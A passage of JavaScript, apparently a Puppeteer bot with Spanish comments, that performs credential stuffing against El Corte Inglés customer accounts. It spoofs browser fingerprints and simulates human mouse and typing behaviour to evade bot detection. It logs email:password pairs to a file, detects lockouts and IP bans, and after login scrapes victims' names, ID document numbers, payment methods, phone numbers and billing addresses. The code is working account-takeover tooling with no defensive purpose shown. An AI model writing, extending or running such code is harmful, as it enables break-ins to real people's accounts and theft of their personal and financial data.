            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Fedora 35': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce RTX 2080 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 630',
            'GeForce GTX 1660 Super', 'Radeon RX 5500 XT', 'GeForce GTX 1080'
        ],
        'Debian 10': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce RTX 2080 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 630',
            'GeForce GTX 1660 Super', 'Radeon RX 5500 XT', 'GeForce GTX 1080'
        ],
        'Debian 11': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Raspbian 10': [
            'Broadcom VideoCore IV', 'ARM Mali-400 MP2', 'Vivante GC7000',
            'Qualcomm Adreno 306', 'Imagination PowerVR SGX531', 'Broadcom VideoCore VI'
        ],
        'Raspbian 11': [
            'Broadcom VideoCore IV', 'ARM Mali-400 MP2', 'Vivante GC7000',
            'Qualcomm Adreno 306', 'Imagination PowerVR SGX531', 'Broadcom VideoCore VI'
        ],
        'Gentoo': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Arch Linux': [
            'GeForce GTX 1050', 'Radeon RX 580', 'Intel(R) Iris(TM) Xe Graphics',
            'GeForce RTX 2080 Ti', 'Radeon RX 570', 'Intel(R) UHD Graphics 630',
            'GeForce GTX 1660 Super', 'Radeon RX 5500 XT', 'GeForce GTX 1080'
        ],
        'Manjaro': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Solaris': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'SunOS': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'AIX': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'HP-UX': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'IRIX': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Haiku': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'ReactOS': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'QNX': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Plan 9': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'MorphOS': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'AmigaOS': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'AROS': [
            'GeForce GTX 970', 'Radeon RX 570', 'Intel(R) HD Graphics 530',
            'GeForce GTX 750 Ti', 'Radeon RX 560', 'Intel(R) UHD Graphics 620',
            'GeForce GTX 1050 Ti', 'Radeon R9 290', 'GeForce GTX 1060'
        ],
        'Symbian': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'BlackBerry': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Windows Phone 8.1': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Windows Phone 10': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'MeeGo': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Tizen': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Firefox OS': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'KaiOS': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Bada': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'webOS': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'Palm OS': [
            'Qualcomm Adreno 330', 'ARM Mali-450 MP4', 'PowerVR SGX544MP',
            'Broadcom VideoCore IV', 'Vivante GC4000', 'Imagination PowerVR SGX531'
        ],
        'BeOS': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'OS/2': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'MS-DOS': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Windows CE': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Windows Mobile 6.5': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Nokia Series 40': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Nokia Asha': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Tizen 4.0': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ],
        'Tizen 5.0': [
            'Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580', 
            'Intel(R) UHD Graphics 630', 'GeForce RTX 2080', 'Radeon RX 5700 XT',
            'GeForce GTX 1660 Ti', 'Intel(R) HD Graphics 530', 'GeForce GTX 980'
        ]
    };
    const screenResolutionOptions = [
        { width: 1920, height: 1080 },
        { width: 1366, height: 768 },
        { width: 1440, height: 900 },
        { width: 1536, height: 864 },
        { width: 1280, height: 800 },
        { width: 2560, height: 1440 },
        { width: 3840, height: 2160 },
        { width: 1600, height: 900 },
        { width: 1024, height: 768 },
        { width: 2880, height: 1800 },
        { width: 1360, height: 768 },
        { width: 1680, height: 1050 },
        { width: 1280, height: 1024 },
        { width: 1440, height: 1080 },
        { width: 3200, height: 1800 },
        { width: 2560, height: 1600 },
        { width: 2048, height: 1536 },
        { width: 3840, height: 1600 },
        { width: 3840, height: 1080 },
        { width: 3440, height: 1440 },
        { width: 5120, height: 2880 },
        { width: 1920, height: 1200 },
        { width: 2304, height: 1440 },
        { width: 2560, height: 1080 },
        { width: 3000, height: 2000 },
        { width: 2736, height: 1824 },
        { width: 3200, height: 2000 },
        { width: 1366, height: 1024 },
        { width: 7680, height: 4320 },
        { width: 1440, height: 2560 },
        { width: 1080, height: 1920 },
        { width: 2160, height: 3840 },
        { width: 800, height: 1280 },
        { width: 1280, height: 720 },
        { width: 1024, height: 600 },
        { width: 640, height: 480 },
        { width: 800, height: 600 },
        { width: 854, height: 480 },
        { width: 320, height: 240 },
        { width: 360, height: 640 },
        { width: 320, height: 480 },
        { width: 480, height: 800 },
        { width: 540, height: 960 },
        { width: 960, height: 540 },
        { width: 1152, height: 864 },
        { width: 1600, height: 1200 },
        { width: 2048, height: 1152 },
        { width: 2160, height: 1440 },
        { width: 3840, height: 1200 },
        { width: 2560, height: 1700 },
        { width: 1024, height: 576 },
        { width: 768, height: 1024 }
    ];

    const platform = platformOptions[Math.floor(Math.random() * platformOptions.length)];
    const randomScreen = screenResolutionOptions[Math.floor(Math.random() * screenResolutionOptions.length)];

    return {
        hardwareConcurrency: hardwareConcurrencyOptions[Math.floor(Math.random() * hardwareConcurrencyOptions.length)],
        deviceMemory: deviceMemoryOptions[Math.floor(Math.random() * deviceMemoryOptions.length)],
        platform: platform,
        languages: languageOptions[Math.floor(Math.random() * languageOptions.length)],
        vendor: vendorOptions[platform],
        webGLVendor: webGLVendorOptions[platform][Math.floor(Math.random() * webGLVendorOptions[platform].length)],
        webGLRenderer: webGLRendererOptions[platform][Math.floor(Math.random() * webGLRendererOptions[platform].length)],
        screen: randomScreen
    };
}

// Obtiene el fingerprint almacenado en caché o genera uno nuevo si no existe
function getCachedFingerprint() {
    if (!cachedFingerprint) {
        cachedFingerprint = getRandomFingerprint();
    }
    return cachedFingerprint;
}

// Resetea la cache del fingerprint para que se genere uno nuevo en la próxima llamada
function resetFingerprintCache() {
    cachedFingerprint = null;
}

// Aplica el fingerprint configurado al navegador
function configureFingerprint(page) {
    const fingerprint = getCachedFingerprint();

    return page.evaluateOnNewDocument((fingerprint) => {
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => fingerprint.hardwareConcurrency });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => fingerprint.deviceMemory });
        Object.defineProperty(navigator, 'platform', { get: () => fingerprint.platform });
        Object.defineProperty(navigator, 'languages', { get: () => fingerprint.languages });
        Object.defineProperty(navigator, 'vendor', { get: () => fingerprint.vendor });
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'doNotTrack', { get: () => '1' });

        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return fingerprint.webGLVendor;
            if (parameter === 37446) return fingerprint.webGLRenderer;
            return getParameter(parameter);
        };

        const getContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            const context = getContext.apply(this, [type, ...args]);
            if (type === '2d' || type === 'webgl') {
                const getImageData = context.getImageData;
                context.getImageData = function(x, y, width, height) {
                    const imageData = getImageData.apply(this, [x, y, width, height]);
                    for (let i = 0; i < imageData.data.length; i += 4) {
                        imageData.data[i] ^= 0x01;
                        imageData.data[i + 1] ^= 0x01;
                        imageData.data[i + 2] ^= 0x01;
                    }
                    return imageData;
                };
            }
            return context;
        };

        // Simular las propiedades de la pantalla
        Object.defineProperty(screen, 'width', { get: () => fingerprint.screen.width });
        Object.defineProperty(screen, 'height', { get: () => fingerprint.screen.height });
        Object.defineProperty(screen, 'availWidth', { get: () => fingerprint.screen.width });
        Object.defineProperty(screen, 'availHeight', { get: () => fingerprint.screen.height - 40 });

        // Parchado de funciones del navegador
        const patchFunction = (obj, funcName, newFunc) => {
            const originalFunc = obj[funcName];
            obj[funcName] = function(...args) {
                return newFunc.apply(this, [originalFunc.bind(this), ...args]);
            };
        };

        patchFunction(navigator, 'getBattery', (originalFunc) => {
            return Promise.resolve({
                charging: true,
                chargingTime: 0,
                dischargingTime: Infinity,
                level: 1.0
            });
        });
    }, fingerprint);
}






 function getUserAgent() {
    try {
        const userAgent = execSync('python3 get_user_agent.py').toString().trim();
        return userAgent;
    } catch (error) {
        console.error('Error al obtener el User-Agent:', error.message);
        throw error;
    }
}





async function login(page, email, password, humanizedMode) {
    try {
        // Rellenar los campos de login y password
        await fillLoginForm(page, email, password, humanizedMode);

        // Obtener la URL inicial antes de hacer clic
        const initialUrl = await page.url();

        const loginButtonSelector = '#login-btn';

        // Verificar que el botón de login esté disponible y visible
        try {
            await page.waitForSelector(loginButtonSelector, { visible: true, timeout: 5000 });
        } catch (error) {
            throw new Error('El botón de login no está disponible. Puede que el servidor no esté respondiendo.');
        }

        // Intentar hacer clic en el botón de login con humanización
        if (humanizedMode) {
     // Obtener la posición del botón de login
     const loginButtonPosition = await page.$eval(loginButtonSelector, (el) => {
        // Definir randomJitter dentro de este contexto
        function randomJitter() {
            return Math.random() * 4 - 2; // Pequeño ajuste entre -2 y +2 píxeles
        }
        const { top, left, width, height } = el.getBoundingClientRect();
        return {
            x: left + width / 2 + randomJitter(),
            y: top + height / 2 + randomJitter()
        };
    });

    // Mover el ratón hacia el botón de manera errática
    await moveMouseErratically(page, randomPosition(), randomPosition(), loginButtonPosition.x, loginButtonPosition.y);

    // Simular una pausa como si estuviera pensando
    await randomDelay(300, 700);

    // Posible clic fallido (clic en otro lugar cercano)
    if (Math.random() < 0.2) { // 20% de probabilidad de clic fallido
        await page.mouse.click(loginButtonPosition.x + randomJitter(10, 20), loginButtonPosition.y + randomJitter(10, 20));
        await randomDelay(300, 600); // Pausa antes de intentar de nuevo
        await moveMouseErratically(page, loginButtonPosition.x + randomJitter(), loginButtonPosition.y + randomJitter(), loginButtonPosition.x, loginButtonPosition.y);
    }

    // Clic en el botón de login
    await page.mouse.click(loginButtonPosition.x, loginButtonPosition.y, { delay: randomDelay(50, 150) });
    console.log('Se ha pulsado el botón de login (modo humanizado).');


        } else {
            // Modo no humanizado: clic directo
            try {
                await page.click(loginButtonSelector);
                console.log('Se ha pulsado el botón de login.');
            } catch (error) {
                throw new Error('No se pudo pulsar el botón de login. El servidor puede no estar respondiendo.');
            }
        }
         // Verificar si el botón de advertencia aparece
         const acceptButtonSelector = '.eci-button-2._primary._focusable.btn-primary';

         try {
            const acceptButton = await page.waitForSelector(acceptButtonSelector, { timeout: 1000 }).catch(() => null);
        
            if (acceptButton) {
                console.log('Botón detectado');
                await handlePasswordWarning(acceptButton);            
                console.log('La página terminó de cargarse después de manejar la advertencia.');
            } else {
                console.log('Botón no encontrado, continuando sin errores.');
            }
        } catch (error) {
            console.error('Error inesperado:', error);
        }
        
        
        
        console.log('Esperando la monitorización de login...');
       
        // Comenzar a observar la URL para detectar cambios
        const loginSuccess =  await monitorLoginStatus(page, initialUrl,email,password);

        if (loginSuccess) {
            parentPort.postMessage('Usuario logueado correctamente');
            return true;
        } else {
            parentPort.postMessage('Datos incorrectos.');
            return false;
        }
    } catch (error) {
        throw error;
    }
}

// Función para rellenar el formulario de login
async function fillLoginForm(page, email, password, humanizedMode) {
    if (humanizedMode) {
      // Simula un ligero movimiento del mouse antes de interactuar
        const loginPosition = await page.$eval('#login', (el) => {
            function randomJitter() {
                return Math.random() * 4 - 2; // Pequeño ajuste entre -2 y +2 píxeles
            }
            const { top, left, width, height } = el.getBoundingClientRect();
            return {
                x: left + width / 2 + randomJitter(),
                y: top + height / 2 + randomJitter()
            };
        });

        // Movimiento errático del ratón antes de enfocarse en el campo
        await moveMouseErratically(page, randomPosition(), randomPosition(), loginPosition.x, loginPosition.y);
        await randomDelay(300, 700); // Pausa como si estuviera pensando

        // Focalizar y escribir el email con posibles errores y correcciones
        await page.focus('#login');
        await typeWithHumanError(page, '#login', email);

        // Posible desenfoque, como si el usuario revisara algo más
        if (Math.random() < 0.3) {
            await page.mouse.click(randomPosition(), randomPosition());
            await randomDelay(300, 600);
            await page.focus('#login');
        }

        const passwordPosition = await page.$eval('#password', (el) => {
            function randomJitter() {
                return Math.random() * 4 - 2; // Pequeño ajuste entre -2 y +2 píxeles
            }
            const { top, left, width, height } = el.getBoundingClientRect();
            return {
                x: left + width / 2 + randomJitter(),
                y: top + height / 2 + randomJitter()
            };
        });

        // Movimiento errático antes de enfocarse en el campo de la contraseña
        await moveMouseErratically(page, loginPosition.x, loginPosition.y, passwordPosition.x, passwordPosition.y);
        await randomDelay(300, 600); // Pausa como si estuviera pensando

        // Focalizar y escribir la contraseña con posibles errores y correcciones
        await page.focus('#password');
        await typeWithHumanError(page, '#password', password);

        // Revisión humana final
        if (Math.random() < 0.5) {
            await randomDelay(500, 1000); // Pausa más larga como si estuviera revisando el texto
        }
  

    } else {
        // Modo no humanizado: acciones más rápidas
        await page.focus('#login');
        await page.type('#login', email, { delay: 0 });
        await page.focus('#password');
        await page.type('#password', password, { delay: 0 });
    }

    await checkPaused(); // Este es tu método que asumo simula pausas controladas
}


// Función para monitorizar el estado de login mediante la observación de la URL
async function monitorLoginStatus(page, initialUrl,email,password) {
    console.log('Iniciando monitorización de login...');
    const maxWaitTime = 15000; 
    const startTime = Date.now();

    while (Date.now() - startTime < maxWaitTime) {
        // Esperar 1 segundo entre cada verificación
        await new Promise(resolve => setTimeout(resolve, 2000));

        const currentUrl = await page.url();

        // Verificar si la URL ha cambiado
        if (currentUrl !== initialUrl) {
            console.log(`La URL ha cambiado a: ${currentUrl}`);

            // Verificar si el login fue exitoso
            if (currentUrl.includes('/servicios/citas/')) {
                return true; // Login exitoso
            }

            // Verificar si hay una solicitud de cambio de contraseña
            if (currentUrl.includes('/cambiar-contrasena/')) {
                throw new Error('El usuario pide cambiar la contraseña.');
            }

            // Manejar cualquier error específico de la URL
            if (currentUrl.includes('error=login_lockdown&back_to=%2F')) {
                fs.appendFileSync('unverified.txt', `${email}:${password}\n`);
                throw new Error('Captcha detectado. No se puede proceder.');
            }

            if (currentUrl.includes('chrome-error://chromewebdata/')) {
                throw new Error('Redirección a URL de error detectada.');
            }

            if (currentUrl.includes('error=invalid_grant')) {
               return false; // Login fallido
            }

            await checkAccessDenied(page);
            
        }
           
        
    }
    const currentUrl = await page.url()
    if(currentUrl == initialUrl){
   
        throw new Error('El servidor no respondió después de hacer clic en el botón de login.');
     
    }

    console.log('Tiempo máximo de espera alcanzado. No se pudo completar el login.');
    return false; // No se completó el login dentro del tiempo permitido
}

// Verificar si hay un mensaje de error en la página
async function isLoginErrorMessageVisible(page) {
    const errorMessageSelector = '.eci_message-text';
    const expectedText = 'Usuario o contraseña incorrectos';

    try {
        const result = await page.evaluate(
            (selector, expectedText) => {
                const element = document.querySelector(selector);
                return element && element.innerText.includes(expectedText);
            },
            errorMessageSelector,
            expectedText
        );
        return result;
    } catch {
        return false;
    }
}

// Manejar errores específicos del login
function handleLoginError(error) {
    console.error('Error durante el proceso de login:', error);
    throw error; // Re-lanzar el error para que pueda ser manejado en otro lugar si es necesario
}





async function handlePasswordWarning(acceptButton, page) {
    try {
        // Hacer el primer clic
        await acceptButton.click();
        
        // Esperar 100 ms antes de intentar el siguiente clic
        await new Promise(resolve => setTimeout(resolve, 100));

        // Hacer el segundo clic
        await acceptButton.click();

       

        return true; // Indica que se han realizado los 2 intentos y se manejó la navegación
    } catch (error) {
        if (error.message.includes('Execution context was destroyed')) {
            parentPort.postMessage('El contexto fue destruido debido a la navegación después del segundo clic.');
            return true; // Considera que el proceso se completó correctamente
        } else if (error.message.includes('No se detectó navegación')) {
            parentPort.postMessage('Error: No se detectó navegación después del segundo clic.');
            return false;
        } else {
            console.error('Error al intentar manejar la advertencia de contraseña insegura:', error);
            return false;
        }
    }
}














async function checkAccessDenied(page) {
    const accessDenied = await page.evaluate(() => {
        const h1Element = document.querySelector('h1');
        return h1Element && h1Element.textContent.includes('Access Denied');
    });

    if (accessDenied) {
        // Puedes cambiar el mensaje o la acción según lo necesites
        parentPort.postMessage('Access Denied detectado');
        throw new Error('IP bloqueada');
    }
}

async function rejectCookies(page) {
    const rejectButtonSelector = '#onetrust-reject-all-handler';

    try {

        await page.waitForSelector(rejectButtonSelector, { timeout: 5000 });


        await page.click(rejectButtonSelector);

        parentPort.postMessage('Cookies rechazadas.');
    } catch (error) {
        parentPort.postMessage('Botón de rechazo de cookies no encontrado o no se mostró.');
    }
}




async function extractUserData(page) {

    await page.goto('https://cuenta.elcorteingles.es/es/perfil/datos-personales/', {
        waitUntil: ['load', 'networkidle2'],
        timeout: 60000
    });


    await page.waitForSelector('#given_name');
    await page.waitForSelector('#first_family_name');
    await page.waitForSelector('#second_family_name');
    await page.waitForSelector('#alias');
    await page.waitForSelector('input[name="id_document"]');

    const userData = await page.evaluate(() => {
        const getInputValue = (selector) => document.querySelector(selector)?.value || '';

        return {
            nombre: getInputValue('#given_name'),
            apellido1: getInputValue('#first_family_name'),
            apellido2: getInputValue('#second_family_name'),
            alias: getInputValue('#alias'),
            documento: getInputValue('input[name="id_document"]')
        };
    });

    parentPort.postMessage(`Datos personales extraídos: ${JSON.stringify(userData)}`);
    return userData;
}

async function extractPaymentMethods(page) {
    // Navegar a la URL de medios de pago
    await page.goto('https://cuenta.elcorteingles.es/es/medios-de-pago/', { waitUntil: 'networkidle2' });

    // Verificar si existen elementos de métodos de pago
    const hasPaymentMethods = await page.$('[data-test-id="payment-method-item"]');

    if (!hasPaymentMethods) {
        return {
            found: false,
            paymentMethods: []
        }; // Retorna un objeto indicando que no se encontraron métodos de pago
    }

    // Extraer los datos de los métodos de pago
    const paymentMethods = await page.evaluate(() => {
        const methods = [];
        const items = document.querySelectorAll('[data-test-id="payment-method-item"]');

        items.forEach(item => {
            const alias = item.querySelector('[data-test-id="payment-method-item-alias-wrapper"] span')?.innerText || 'Sin Alias';
            const description = item.querySelector('[data-test-id="payment-method-item-description-wrapper"]')?.innerText || 'Sin Descripción';
            const maskedNumber = item.querySelector('[data-test-id="payment-method-item-mask-wrapper"]')?.innerText || 'Sin Número';
            const isDefault = item.querySelector('.eci-tag._primary') !== null; // Comprueba si es el método por defecto

            methods.push({
                alias,
                description,
                maskedNumber,
                isDefault
            });
        });

        return methods;
    });

    parentPort.postMessage(`Métodos de Pago Extraídos: ${JSON.stringify(paymentMethods)}`);
    return {
        found: true,
        paymentMethods
    }; // Retorna un objeto con los métodos de pago y que indica que sí se encontraron
}



async function extractPhoneNumber(page, startX, startY, endX, endY) {
    try {
        // Paso 1: Navegar a la página del producto y añadirlo a la cesta
        await page.goto('https://www.elcorteingles.es/electronica/A49690744-apple-macbook-pro-16-2023-m3-max-48gb-1tb-ssd-16-macos/', {
            waitUntil: ['load', 'networkidle2'],
            timeout: 60000
        });
        await checkAccessDenied(page);

        const addButtonSelector = '.product_detail-add_to_cart.pointer, .product-detail-add-to-cart.pointer';

        page.click(addButtonSelector),
            page.waitForNavigation({ waitUntil: 'networkidle2' })


        await new Promise(resolve => setTimeout(resolve, randomDelay(10000, 15000)));

        // Paso 2: Navegar a la cesta
        await checkPaused();

        await page.goto('https://www.elcorteingles.es/compra/tramitacion/cesta', { waitUntil: 'networkidle2' });

        // Verificar si la cesta está vacía
        const cartIsEmpty = await page.evaluate(() => {
            return document.querySelector('h4.cart-empty') !== null;
        });

        if (cartIsEmpty) {
            parentPort.postMessage('La cesta está vacía.');
            return null; // Salir si la cesta está vacía
        }

        await checkPaused();

        // Paso 3: Navegar a la página de pago
        await navigateToPaymentPage(page);
        await checkPaused();
        // Paso 4: Extraer los datos de la dirección y el número de teléfono usando el método mejorado
        const extractedData = await extractPhoneNumberAndAddress(page);

        // Verificar si se encontró un número de teléfono
        if (!extractedData.telefono) {
            parentPort.postMessage('No se encontró ningún número de teléfono.');
            return null; // Retornar null si no hay número de teléfono
        }



        return extractedData;

    } catch (error) {
        parentPort.postMessage('Error al acceder a la página de la cesta o al extraer los datos.');
        console.error('Error:', error); // Registro adicional para depuración
        return null;
    }
}

async function extractPhoneNumberAndAddress(page) {
    try {
        const xp = '::-p-xpath(/html/body/script[1])';
        const el = await page.waitForSelector(xp, { timeout: 30000 });

        if (!el) {
            throw new Error('No se pudo encontrar el script con el XPath proporcionado.');
        }

        // Obtener el contenido del script
        const scriptContent = await page.evaluate(script => script.innerText, el);

        // Inicializar las variables para almacenar los datos extraídos
        let extractedData = {
            nombre: null,
            primerApellido: null,
            segundoApellido: null,
            calle: null,
            numero: null,
            piso: null,
            puerta: null,
            codigoPostal: null,
            ciudad: null,
            telefono: null,
            additionalPhones: [],
            telefonoPorDefecto: null,
            pais: null,
            provincia: null,
            fechaNacimiento: null,
            tipoDocumento: null,
            numeroDocumento: null,
            cuponesDisponibles: null,
            direccionesAdicionales: []
        };

        // Extraer "available_contacts" (teléfonos adicionales)
        const phonesMatch = scriptContent.match(/"available_contacts":\["(.*?)"\]/);
        if (phonesMatch) {
            extractedData.additionalPhones = phonesMatch[1].split('","');
            extractedData.telefono = extractedData.additionalPhones[0]; // Primer teléfono como principal
        }

        // Extraer el bloque "body" y buscar el teléfono con "tags"
        const bodyMatch = scriptContent.match(/"body":\s*{[^}]*"result":\s*\[(.*?)\]\s*}/s);
        if (bodyMatch) {
            try {
                const resultBlock = JSON.parse(`[${bodyMatch[1]}]`);
                const defaultPhoneEntry = resultBlock.find(phone => phone.tags && phone.tags.length > 0);
                if (defaultPhoneEntry) {
                    extractedData.telefonoPorDefecto = defaultPhoneEntry.number;
                }
            } catch (e) {
                console.error('Error al parsear body.result:', e.message);
            }
        }

        // Extraer "billing_address" (dirección de facturación)
        const billingAddressMatch = scriptContent.match(/"billing_address":\s*(\{.*?\})\s*,\s*"(?:total_price|subtotal_price|total_shipping_price)"/s);
        if (billingAddressMatch) {
            try {
                const billingAddress = JSON.parse(billingAddressMatch[1]).address || {};

                extractedData.nombre = billingAddress.first_name || null;
                extractedData.primerApellido = billingAddress.last_name || null;
                extractedData.segundoApellido = billingAddress.second_last_name || null;
                extractedData.calle = billingAddress.street_name || null;
                extractedData.numero = billingAddress.house_number || null;
                extractedData.piso = billingAddress.level || null;
                extractedData.puerta = billingAddress.door || null;
                extractedData.codigoPostal = billingAddress.postal_code || null;
